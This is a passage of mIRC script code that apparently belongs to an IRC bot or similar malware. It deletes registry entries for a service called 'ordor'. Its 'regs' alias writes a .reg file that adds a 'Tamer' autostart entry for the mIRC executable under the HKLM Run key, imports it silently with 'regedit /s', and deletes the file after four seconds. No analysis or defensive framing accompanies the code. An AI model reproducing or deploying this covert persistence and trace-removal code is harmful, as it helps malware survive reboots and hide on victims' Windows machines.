  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\ordor\DisplayName)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\ordor\Description)
  echo $regdelete(HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\ordor)
}
alias regs { 
  set %filetoboot flk23.reg 
  write %filetoboot  REGEDIT4
  write %filetoboot [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]  
  write %filetoboot "Tamer"=" $+ $replace($mircexe,\,\\) $+ "  
  run -n regedit /s %filetoboot
  timer 1 4 remove %filetoboot
}